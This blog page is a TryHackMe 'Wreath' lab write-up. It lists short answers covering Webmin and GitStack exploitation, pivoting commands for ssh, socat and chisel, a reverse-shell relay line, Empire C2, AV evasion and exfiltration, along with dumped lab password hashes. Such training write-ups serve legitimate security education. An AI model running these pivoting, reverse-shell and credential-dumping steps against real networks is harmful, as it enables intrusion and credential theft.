<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    
    
    
    
    

    
    <title>THM | Wreath</title>
    <meta name="description" content="Cyber Security, Tech &amp; IT">
    <meta name="keywords" content='blog, Mansoor, Barri, Tech, Hacking, writeups, thm'>

    <meta property="og:url" content="https://mansoorbarri.com/writeups/wreath/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="THM | Wreath">
    <meta property="og:description" content="Cyber Security, Tech &amp; IT">
    <meta property="og:image" content="/main.webp">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="THM | Wreath">
    <meta name="twitter:description" content="Cyber Security, Tech &amp; IT">
    <meta property="twitter:domain" content="https://mansoorbarri.com/writeups/wreath/">
    <meta property="twitter:url" content="https://mansoorbarri.com/writeups/wreath/">
    <meta name="twitter:image" content="/main.webp">

    
    <link rel="canonical" href="https://mansoorbarri.com/writeups/wreath/" />

    <link rel="stylesheet" type="text/css" href="https://mansoorbarri.com/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://mansoorbarri.com/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://mansoorbarri.com/css/dark.css">

    <script src="https://mansoorbarri.com/js/svg-injector.min.js"></script>
    <script src="https://mansoorbarri.com/js/feather-icons.min.js"></script>
    <script src="https://mansoorbarri.com/js/main.js"></script>

    
    
      <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RCCJG9ZD5L"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-RCCJG9ZD5L');
  </script>
  
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        
        <div class="avatar">
            <a href="https://mansoorbarri.com">
                <img src="https://mansoorbarri.com/main.webp" alt="avatar" />
            </a>
        </div>
        

        <div class="nav-title">
            <a class="nav-brand" href="https://mansoorbarri.com">Mansoor Barri</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://mansoorbarri.com/"> Home </a>
            </div>
            
            <div class="nav-link">
                <a href="https://mansoorbarri.com/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://mansoorbarri.com/writeups/"> Writeups </a>
            </div>
            
            <div class="nav-link">
                <a href="https://mansoorbarri.com/projects/"> Projects </a>
            </div>
            
            <div class="nav-link">
                <a href="https://mansoorbarri.com/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/mansoorbarri"><span data-feather='github'></span>  </a>
            </div>
            
            <div class="nav-link">
                <a href="https://mansoorbarri.com/contact-us/"><span data-feather='phone-call'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://mansoorbarri.com/"> Home </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://mansoorbarri.com/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://mansoorbarri.com/writeups/"> Writeups </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://mansoorbarri.com/projects/"> Projects </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://mansoorbarri.com/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/mansoorbarri"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://mansoorbarri.com/contact-us/"><span data-feather='phone-call'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>THM | Wreath</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            January 20, 2022
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://mansoorbarri.com/tags/writeups">writeups</a></li>
        
            <li class="post-tag"><a href="https://mansoorbarri.com/tags/thm">thm</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <h2 id="room">Room</h2>
<p><a href="https://tryhackme.com/room/wreath">https://tryhackme.com/room/wreath</a></p>
<h2 id="task-1-4-intro">Task 1-4: Intro</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-5-webserver-enumeration">Task 5: Webserver Enumeration</h2>
<h4 id="question-1-how-many-of-the-first-15000-ports-are-open-on-the-target">Question 1: How many of the first 15000 ports are open on the target?</h4>
<p><em>~ 4</em></p>
<h4 id="question-2-what-os-does-nmap-think-is-running">Question 2: What OS does nmap think is running?</h4>
<p><em>~ CentOS</em></p>
<h4 id="question-3-open-the-ip-in-your-browser--what-site-does-the-sever-try-to-redirect-you-to">Question 3: Open the IP in your browser — what site does the sever try to redirect you to?</h4>
<p><em>~ <a href="https://thomaswreath.thm">https://thomaswreath.thm</a></em></p>
<h4 id="question-4-what-is-thomas-mobile-phone-number">Question 4: What is Thomas’ mobile phone number?</h4>
<p><em>~ +447821548812</em></p>
<h4 id="question-5-what-server-version-does-nmap-detect-as-running-here">Question 5: What server version does Nmap detect as running here?</h4>
<p><em>~ MiniServ 1.890 (Webmin httpd)</em></p>
<h4 id="question-6-what-is-the-cve-number-for-this-exploit">Question 6: What is the CVE number for this exploit?</h4>
<p><em>~ CVE-2019–15107</em></p>
<h2 id="task-6-webserver-exploitation">Task 6: Webserver Exploitation</h2>
<h4 id="question-1-which-user-was-the-server-running-as">Question 1: Which user was the server running as?</h4>
<p><em>~ root</em></p>
<h4 id="question-2-what-is-the-root-users-password-hash">Question 2: What is the root user’s password hash?</h4>
<pre><code>$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
</code></pre><h4 id="question-3--what-is-the-full-path-to-his-file">Question 3:  What is the full path to his file?</h4>
<p><em>~ /root/.ssh/id_rsa</em></p>
<h2 id="task-7-pivoting-what-is-pivoting">Task 7: Pivoting What is Pivoting?</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-8-pivoting-high-level-overview">Task 8: Pivoting High Level Overview</h2>
<h4 id="question-1-which-type-of-pivoting-creates-a-channel-through-which-information-can-be-sent-hidden-inside-another-protocol">Question 1: Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?</h4>
<p><em>~ Tunnelling</em></p>
<h4 id="question-2-which-metasploit-framework-meterpreter-command-can-be-used-to-create-a-port-forward">Question 2: Which Metasploit Framework Meterpreter command can be used to create a port forward?</h4>
<p><em>~ portfwd</em></p>
<h2 id="pivoting-enumeration">Pivoting Enumeration</h2>
<h4 id="question-1-what-is-the-absolute-path-to-the-file-containing-dns-entries-on-linux">Question 1: What is the absolute path to the file containing DNS entries on Linux?</h4>
<p><em>~ /etc/resolv.conf</em></p>
<h4 id="question-2-what-is-the-absolute-path-to-the-hosts-file-on-windows">Question 2: What is the absolute path to the hosts file on Windows?</h4>
<p><em>~ C:\Windows\System32\drivers\etc\hosts</em></p>
<h4 id="question-3-how-could-you-use-which-ip-addresses-re-active-and-allow-icmp-echo-requests-on-the-172160x24-network-using-bash">Question 3: How could you use which IP addresses re active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?</h4>
<p><em>~ for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep “bytes from” &amp;); done</em></p>
<h2 id="task-10-pivoting-proxychains--froxypoxy">Task 10: Pivoting Proxychains &amp; Froxypoxy</h2>
<h4 id="question-1-what-line-you-put-in-your-proxychains-config-gile-to-redirect-through-a-socks4-proxy-on-1720014242">Question 1: What line you put in your proxychains config gile to redirect through a socks4 proxy on 172.0.0.1:4242?</h4>
<p><em>~ socks4 127.0.0.1 4242</em></p>
<h4 id="question-2-what-command-would-you-use-to-telnet-through-a-proxy-to-17216010023">Question 2: What command would you use to telnet through a proxy to 172.16.0.100:23?</h4>
<p><em>~ proxychains telnet 172.16.0.100 23</em></p>
<h4 id="question-3-which-tool-is-more-apt-for-proxying-to-a-webapp-proxychains-pc-or-froxyproxy-fp">Question 3: Which tool is more apt for proxying to a webapp: Proxychains (PC) or FroxyProxy (FP)?</h4>
<p><em>~ FP</em></p>
<h2 id="task-11-pivoting-ssh-tunnellingport-forwarding">Task 11: Pivoting SSH Tunnelling/Port Forwarding</h2>
<h4 id="question-1-if-youre-connecting-to-an-ssh-server-from-your-attacking-machine-to-create-a-port-forward-would-this-be-a-local-l-port-forward-or-a-emote-r-port-forward">Question 1: If you’re connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a emote (R) port forward?</h4>
<p><em>~ L</em></p>
<h4 id="question-2-which-switch-combination-can-be-used-to-background-an-ssh-port-forward-or-tunnel">Question 2: Which switch combination can be used to background an SSH port forward or tunnel?</h4>
<p><em>~ fN</em></p>
<h4 id="question-3-its-a-good-idea-to-enter-our-own-password-on-the-remote-machine-to-set-up-a-reverse-proxy-aye-or-nay">Question 3: It’s a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?</h4>
<p><em>~ Nay</em></p>
<h4 id="question-4-what-command-would-you-use-to-create-a-pair-of-throwaway-ssh-keys-for-a-reverse-connection">Question 4: What command would you use to create a pair of throwaway SSH keys for a reverse connection?</h4>
<p><em>~ ssh-keygen</em></p>
<h4 id="question-5-if-you-wanted-to-set-up-a-reverse-portforward-from-port-22-of-a-remote-machine-172160100-to-port-2222-of-your-local-machine-172160200-using-a-keyfile-called-id_rsa-and-backgrounding-the-shell-what-command-would-you-use-assume-your-username-is-kali">Question 5: If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is &ldquo;kali&rdquo;)</h4>
<p><em>~ ssh -R 2222:172.16.0.100:22 <a href="mailto:kali@172.16.0.200">kali@172.16.0.200</a> -i id_rsa -fN</em></p>
<h4 id="question-6-what-command-would-you-use-to-set-up-a-forward-proxy-on-port-8000-to-usertargetthm-backgrounding-the-shell">Question 6: What command would you use to set up a forward proxy on port 8000 to <a href="mailto:user@target.thm">user@target.thm</a>, backgrounding the shell?</h4>
<p><em>~ ssh -D 8000 <a href="mailto:user@target.thm">user@target.thm</a> -fN</em></p>
<h4 id="question-7-if-you-had-ssh-access-to-a-server-17216050-with-a-webserver-running-internally-on-port-80-ie-only-accessible-to-the-server-itself-on-12700180-how-would-you-forward-it-to-port-8000-on-your-attacking-machine-assume-the-username-is-user-and-background-the-shell">Question 7: If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is &ldquo;user&rdquo;, and background the shell.</h4>
<p><em>~ ssh -L 8000:127.0.0.1:80 <a href="mailto:user@172.16.0.50">user@172.16.0.50</a> -fN</em></p>
<h2 id="task-12-pivoting-plinkexe">Task 12: Pivoting plink.exe</h2>
<h4 id="question-1-what-tool-can-be-used-t-convert-openssh-keys-into-putty-style-keys">Question 1: What tool can be used t convert OpenSSH keys into PuTTY style keys?</h4>
<p><em>~ puttygen</em></p>
<h2 id="task-13-pivoting-socat">Task 13: Pivoting Socat</h2>
<h4 id="question-1-which-socat-option-allows-you-to-reuse-the-same-listening-port-for-more-than-one-connection">Question 1: Which socat option allows you to reuse the same listening port for more than one connection?</h4>
<p><em>~ reuseaddr</em></p>
<h4 id="question-2-if-your-attacking-ip-is-172160200-how-would-you-relay-a-reverse-shell-to-tcp-port-443-on-your-attacking-machine-using-a-static-copy-of-socat-in-the-current-directory">Question 2: If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?</h4>
<p>Use TCP port 8000 for the server listener, and do not background the process.</p>
<p><em>~ ./socat tcp-l:8000 tcp:172.16.0.200:443</em></p>
<h4 id="question-3-what-command-would-you-use-to-forward-tcp-port-2222-on-a-compromised-server-to-17216010022-using-a-static-copy-of-socat-in-the-current-directory-and-backgrounding-the-process-easy-method">Question 3: What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?</h4>
<p><em>~ ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &amp;</em></p>
<h2 id="task-14-pivoting-chisel">Task 14: Pivoting Chisel</h2>
<h4 id="question-1-what-command-would-you-use-to-start-a-chisel-server-for-a-reverse-connection-on-your-attacking-machine">Question 1: What command would you use to start a chisel server for a reverse connection on your attacking machine?</h4>
<p>Use port 4242 for the listener and do not background the process.</p>
<p><em>~ ./chisel server -p 4242 — reverse</em></p>
<h4 id="question-2-what-command-would-you-use-to-connect-back-to-this-server-with-a-socks-proxy-from-a-compromised-host-assuming-your-own-ip-is-172160200-and-backgrounding-the-process">Question 2: What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?</h4>
<p><em>~ ./chisel client 172.16.0.200:4242 R:socks &amp;</em></p>
<h4 id="question-3-how-would-you-forward-1721601003306-to-your-own-port-33060-using-a-chisel-remote-port-forward-assuming-your-own-ip-is-172160200-and-the-listening-port-is-1337-background-this-process">Question 3: How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.</h4>
<p><em>~ ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &amp;</em></p>
<h4 id="question-4-if-you-have-a-chisel-server-running-on-port-4444-of-1721605-how-could-you-create-a-local-portforward-opening-port-8000-locally-and-linking-to-1721601080">Question 4: If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?</h4>
<p><em>~ ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80</em></p>
<h2 id="task-15-pivoting-sshuttle">Task 15: Pivoting sshuttle</h2>
<h4 id="question-1-how-would-you-use-sshuttle-to-connect-to-17216207-with-a-username-of-pwned-and-a-subnet-of-172160016">Question 1: How would you use sshuttle to connect to 172.16.20.7, with a username of “pwned” and a subnet of 172.16.0.0/16</h4>
<p><em>~ sshuttle -r <a href="mailto:pwned@172.16.20.7">pwned@172.16.20.7</a> 172.16.0.0/16</em></p>
<h4 id="question-2-which-switch-and-argument-would-you-use-to-tell-sshuttle-to-use-a-keyfile-called-priv_key-located-in-the-current-directory">Question 2: Which switch (and argument) would you use to tell sshuttle to use a keyfile called “priv_key” located in the current directory?</h4>
<p><em>~ — ssh-cmd “ssh -i priv_key”</em></p>
<h4 id="question-3-what-switch-and-argument-could-you-use-to-fix-this-error">Question 3: What switch (and argument) could you use to fix this error?</h4>
<p><em>~ -x 172.16.0</em></p>
<h2 id="task-16-pivoting-conclusion">Task 16: Pivoting Conclusion</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-17-git-server-enumeration">Task 17: Git Server Enumeration</h2>
<h4 id="question-1-excluding-the-out-of-scope-hosts-and-the-current-host-200-how-many-hosts-were-discovered-active-on-the-network">Question 1: Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?</h4>
<p><em>~ 2</em></p>
<h4 id="question-2-in-ascending-order-what-are-the-last-ocets-of-these-host-ipv4-addresses-eg-if-the-address-was-17216080-submt-the-80">Question 2: In ascending order, what are the last ocets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submt the 80)</h4>
<p><em>~ 100, 150</em></p>
<h4 id="question-3-scan-the-hosts--which-one-does-not-return-a-status-of-filtered-for-every-port-submit-the-last-octet-only">Question 3: Scan the hosts — which one does not return a status of “filtered” for every port (submit the last octet only)?</h4>
<p><em>~ 150</em></p>
<h4 id="question-4-which-tcp-ports-in-ascending-order-comma-separated-below-port-15000-are-open-on-the-remaining-target">Question 4: Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?</h4>
<p><em>~ 80, 3389, 5985</em></p>
<h4 id="question-5-assuming-that-the-service-guesses-made-by-nmap-are-accurate-which-of-the-found-services-is-more-likely-to-contain-an-exploitable-vulnerability">Question 5: Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?</h4>
<p><em>~ HTTP</em></p>
<h2 id="task-18-git-server-pivoting">Task 18: Git server Pivoting</h2>
<h4 id="question-1-what-is-the-name-of-the-program-running-the-service">Question 1: What is the name of the program running the service?</h4>
<p><em>~ Gitstack</em></p>
<h4 id="question-2-do-these-default-credentials-work-ayenay">Question 2: Do these default credentials work (Aye/Nay)?</h4>
<p><em>~ Nay</em></p>
<h4 id="question-3-there-is-one-python-rce-exploit-for-version-2310-of-the-service-what-is-he-edb-id-number-of-this-exploit">Question 3: There is one Python RCE exploit for version 2.3.10 of the service. What is he EDB ID number of this exploit?</h4>
<p><em>~ 43777</em></p>
<h2 id="task-19-git-server-code-review">Task 19: Git server Code review</h2>
<h4 id="question-1-look-at-the-information-at-the-top-of-the-script-on-what-date-was-this-exploit-written">Question 1: Look at the information at the top of the script. On what date was this exploit written?</h4>
<p><em>~ 18.01.2018</em></p>
<h4 id="question-2-bearing-this-in-mind-is-the-script-written-in-python2-or-python3">Question 2: Bearing this in mind, is the script written in python2 or python3?</h4>
<p><em>~ Python 2</em></p>
<h4 id="question-3-just-to-confirm-that-you-have-been-paying-attention-to-the-script-what-is-the-name-of-the-cookie-set-in-the-post-request-made-on-line-74-line-73-if-you-didnt-add-the-shebang-of-the-exploit">Question 3: Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn’t add the shebang) of the exploit?</h4>
<p><em>~ csrftoken</em></p>
<h2 id="task-20-git-server-exploitation">Task 20: Git server Exploitation</h2>
<h4 id="question-1-what-is-the-hostname-for-this-target">Question 1: What is the hostname for this target?</h4>
<p><em>~ git-serv</em></p>
<h4 id="question-2-what-operating-system-is-this-target">Question 2: What operating system is this target?</h4>
<p><em>~ Windows</em></p>
<h4 id="question-3-what-user-is-the-server-running-as">Question 3: What user is the server running as?</h4>
<p><em>~ NT AUTHORITY/SYSTEM</em></p>
<h4 id="question-4-how-many-make-it-to-the-waiting-listener">Question 4: How many make it to the waiting listener?</h4>
<p><em>~ 0</em></p>
<h2 id="task-21-git-server-stabilisation--post-exploitation">Task 21: Git server Stabilisation &amp; Post Exploitation</h2>
<h4 id="question-1-what-is-the-administrator-password-hash">Question 1: What is the Administrator password hash?</h4>
<p><em>~ 37db630168e5f82aafa8461e05c6bbd1</em></p>
<h4 id="question-2-what-is-the-ntlm-password-hash-for-he-user-thomas">Question 2: What is the NTLM password hash for he user “Thomas”?</h4>
<p><em>~ 02d90eda8f6b6b06c32d5f207831101f</em></p>
<h4 id="question-3-what-is-thomas-password">Question 3: What is Thomas’ password?</h4>
<p><em>~ i&lt;3ruby</em></p>
<h2 id="task-22-command-and-control-introduction">Task 22: Command and Control Introduction</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-23-empire-installation">Task 23: Empire: Installation</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-24-empire-overview">Task 24: Empire: Overview</h2>
<h4 id="question-1-can-we-get-an-agent-back-from-the-git-server-directly-ayenay">Question 1: Can we get an agent back from the git server directly (Aye/Nay)?</h4>
<p><em>~ Nay</em></p>
<h2 id="task-25-empire-listeners">Task 25: Empire: Listeners</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-26-empire-stagers">Task 26: Empire: Stagers</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-27-empire-agents">Task 27: Empire: Agents</h2>
<h4 id="question-1-using-the-help-command-for-guidance-in-empire-cli-how-would-we-run-the-whoami-command-inside-an-agent">Question 1: Using the <code>help</code> command for guidance: in Empire CLI, how would we run the <code>whoami</code> command inside an agent?</h4>
<p><em>~ shell whoami</em></p>
<h4 id="task-2832">Task 28–32:</h4>
<p><em>No Answer Needed</em></p>
<h2 id="task-33-personal-pc-enumeration">Task 33: Personal PC Enumeration</h2>
<h4 id="question-1-scan-the-top-50-ports-of-the-last-ip-address-you-found-in-task-17-which-ports-are-open-lowest-to-highest-separated-by-commas">Question 1: Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?</h4>
<p><em>~ 80, 3389</em></p>
<h2 id="task-34-personal-pc-pivoting">Task 34: Personal PC Pivoting</h2>
<h4 id="question-1-using-the-wappalyzer-browser-extension-firefoxhttpsaddonsmozillaorgen-gbfirefoxaddonwappalyzer--chromehttpschromegooglecomwebstoredetailwappalyzergppongmhjkpfnbhagpmjfkannfbllamghlen-or-an-alternative-method-identify-the-server-side-programming-language-including-the-version-number-used-on-the-website">Question 1: Using the Wappalyzer browser extension (<a href="https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/">Firefox</a> | <a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en">Chrome</a>) or an alternative method, identify the server-side Programming language (including the version number) used on the website.</h4>
<p><em>~ PHP 7.4.11</em></p>
<h2 id="task-35-personal-pc-the-wonders-of-git">Task 35: Personal PC The Wonders of git</h2>
<h4 id="question-1use-your-winrm-access-to-look-around-the-git-server-what-is-the-absolute-path-to-the-websitegit-directory">Question 1:Use your WinRM access to look around the Git Server. What is the absolute path to the <code>Website.git</code> directory?</h4>
<p><em>~ C:\Gitstack\Repositories\Website.git</em></p>
<h2 id="task-36-personal-pc-website-code-analysis">Task 36: Personal PC Website Code Analysis</h2>
<h4 id="question-1-what-does-thomas-have-to-hone-mrs-walker-about">Question 1: What does Thomas have to hone Mrs Walker about?</h4>
<p><em>~ Neighbourhood Watch Meetings</em></p>
<h4 id="question-2-aside-from-the-filter-what-protection-method-is-likely-to-be-in-place-to-prevent-people-from-accessing-this-page">Question 2: Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?</h4>
<p><em>~ Basic Auth</em></p>
<h4 id="question-3-which-extensions-are-accepted-comma-separated-no-spaces-or-quotes">Question 3: Which extensions are accepted (comma separated, no spaces or quotes)?</h4>
<p><em>~ jpg, jpeg, png, gif</em></p>
<h2 id="task-37-personal-pc-exploit-poc">Task 37: Personal PC Exploit PoC</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-38-av-evasion-introduction">Task 38: AV Evasion Introduction</h2>
<h4 id="question-1-which-category-of-evasion-covers-uploading-a-file-to-the-storage-on-the-target-before-executing-it">Question 1: Which category of evasion covers uploading a file to the storage on the target before executing it?</h4>
<p><em>~ On-Disk Evasion</em></p>
<h4 id="question-2-what-does-amsi-stand-for">Question 2: What does AMSI stand for?</h4>
<p><em>~ Anti-malware Scan Interface</em></p>
<h4 id="question-3-what-category-of-evasion-does-amsi-affect">Question 3: What category of evasion does AMSI affect?</h4>
<p><em>~ In-Memry Evasion</em></p>
<h2 id="task-39-av-evasion-av-detection-methods">Task 39: AV Evasion AV Detection Methods</h2>
<h4 id="question-1-what-other-nam-can-be-used-for-dynamicheuristic-detection-methods">Question 1: What other nam can be used for Dynamic/Heuristic detection methods?</h4>
<p><em>~ Behavioural</em></p>
<h4 id="question-2-if-av-software-splits-a-program-into-small-chunks-and-hashes-them-checking-he-results-against-a-database-is-this-a-static-or-dynamic-analysis-method">Question 2: If AV software splits a program into small chunks and hashes them, checking he results against a database, is this a static or dynamic analysis method?</h4>
<p><em>~ Static</em></p>
<h4 id="question-3-when-dynamically-analysing-a-suspicious-file-using-a-line-by-line-analysis-of-the-program-what-would-antivirus-software-check-against-to-see-if-the-behaviour-is-malicous">Question 3: When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicous?</h4>
<p><em>~ Pre-defined rules</em></p>
<h4 id="question-4-what-could-be-added-to-a-file-to-ensure-that-only-a-user-can-open-it-preventing-av-from-executing-the-payload">Question 4: What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?</h4>
<p><em>~ Password</em></p>
<h2 id="task-40-av-evasion-php-payload-obfuscation">Task 40: AV Evasion PHP Payload Obfuscation</h2>
<h4 id="question-1-what-is-the-host-name-of-he-target">Question 1: What is the Host Name of he target?</h4>
<p><em>~ WREATH-PC</em></p>
<h4 id="question-2-what-is-our-current-username-include-the-domain-in-this">Question 2: What is our current username (include the domain in this)?</h4>
<p><em>~ wreath-pc/thomas</em></p>
<h2 id="task-41-av-evasion-compiling-netcat--reverse-shell">Task 41: AV Evasion Compiling Netcat &amp; Reverse Shell!</h2>
<h4 id="question-1what-output-do-you-get-when-running-the-command-certutilexe">Question 1:What output do you get when running the command: <code>certutil.exe</code>?</h4>
<p><em>~ CertUtil: -dump command completed successfully.</em></p>
<h2 id="task-42-av-evasion-enumeration">Task 42: AV Evasion Enumeration</h2>
<h4 id="question-1-research-one-of-the-privileges-on-this-list-is-very-famous-for-being-used-in-the-printspoofer-and-potato-series-of-privilege-escalation-exploits--which-privilege-is-this">Question 1: [Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits — which privilege is this?</h4>
<p><em>~ SeImpersonatePrivilege</em></p>
<h4 id="question-2-what-is-the-name-second-columm-from-the-left-of-this-service">Question 2: What is the Name (second columm from the left) of this service?</h4>
<p><em>~ SystemExplorerHelpService</em></p>
<h4 id="question-3-is-the-service-running-as-the-local-system-account-ayenay">Question 3: is the service running as the local system account (Aye/Nay)?</h4>
<p><em>~ Aye</em></p>
<h2 id="task-43-av-evasion-privilege-escalation">Task 43: AV Evasion Privilege Escalation</h2>
<p><em>No Answer Needed</em></p>
<h2 id="task-44-av-evasion-exfiltration-techniques--post-exploitation">Task 44: AV Evasion Exfiltration Techniques &amp; Post Exploitation</h2>
<h4 id="question-1-is-ftp-a-good-protocol-to-use-when-exfiltrating-data-in-a-modem-network-ayenay">Question 1: Is FTP a good protocol to use when exfiltrating data in a modem network (Aye/Nay)?</h4>
<p><em>~ Nay</em></p>
<h4 id="question-2-for-what-reason-is-https-preferred-over-http-during-exfiltration">Question 2: For what reason is HTTPS preferred over HTTP during exfiltration?</h4>
<p><em>~ Encryption</em></p>
<h4 id="question-3-what-is-the-administrator-nt-hash-for-this-target">Question 3: What is the administrator NT hash for this target?</h4>
<p><em>~ a05c3c807ceeb48c47252568da284cd2</em></p>
<h2 id="task-4546">Task 45–46:</h2>
<p><em>No Answer Needed</em></p>
<p>that&rsquo;s it ✌🏽</p>
<hr>
 
<script src="https://utteranc.es/client.js"
        repo="mansoorbarri/website"
        issue-term="title"
        theme="dark-blue"
        crossorigin="anonymous"
        async>
</script>



        </p>
    </div>

    <div class="prev-next">
        
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#room">Room</a></li>
        <li><a href="#task-1-4-intro">Task 1-4: Intro</a></li>
        <li><a href="#task-5-webserver-enumeration">Task 5: Webserver Enumeration</a></li>
        <li><a href="#task-6-webserver-exploitation">Task 6: Webserver Exploitation</a></li>
        <li><a href="#task-7-pivoting-what-is-pivoting">Task 7: Pivoting What is Pivoting?</a></li>
        <li><a href="#task-8-pivoting-high-level-overview">Task 8: Pivoting High Level Overview</a></li>
        <li><a href="#pivoting-enumeration">Pivoting Enumeration</a></li>
        <li><a href="#task-10-pivoting-proxychains--froxypoxy">Task 10: Pivoting Proxychains &amp; Froxypoxy</a></li>
        <li><a href="#task-11-pivoting-ssh-tunnellingport-forwarding">Task 11: Pivoting SSH Tunnelling/Port Forwarding</a></li>
        <li><a href="#task-12-pivoting-plinkexe">Task 12: Pivoting plink.exe</a></li>
        <li><a href="#task-13-pivoting-socat">Task 13: Pivoting Socat</a></li>
        <li><a href="#task-14-pivoting-chisel">Task 14: Pivoting Chisel</a></li>
        <li><a href="#task-15-pivoting-sshuttle">Task 15: Pivoting sshuttle</a></li>
        <li><a href="#task-16-pivoting-conclusion">Task 16: Pivoting Conclusion</a></li>
        <li><a href="#task-17-git-server-enumeration">Task 17: Git Server Enumeration</a></li>
        <li><a href="#task-18-git-server-pivoting">Task 18: Git server Pivoting</a></li>
        <li><a href="#task-19-git-server-code-review">Task 19: Git server Code review</a></li>
        <li><a href="#task-20-git-server-exploitation">Task 20: Git server Exploitation</a></li>
        <li><a href="#task-21-git-server-stabilisation--post-exploitation">Task 21: Git server Stabilisation &amp; Post Exploitation</a></li>
        <li><a href="#task-22-command-and-control-introduction">Task 22: Command and Control Introduction</a></li>
        <li><a href="#task-23-empire-installation">Task 23: Empire: Installation</a></li>
        <li><a href="#task-24-empire-overview">Task 24: Empire: Overview</a></li>
        <li><a href="#task-25-empire-listeners">Task 25: Empire: Listeners</a></li>
        <li><a href="#task-26-empire-stagers">Task 26: Empire: Stagers</a></li>
        <li><a href="#task-27-empire-agents">Task 27: Empire: Agents</a></li>
        <li><a href="#task-33-personal-pc-enumeration">Task 33: Personal PC Enumeration</a></li>
        <li><a href="#task-34-personal-pc-pivoting">Task 34: Personal PC Pivoting</a></li>
        <li><a href="#task-35-personal-pc-the-wonders-of-git">Task 35: Personal PC The Wonders of git</a></li>
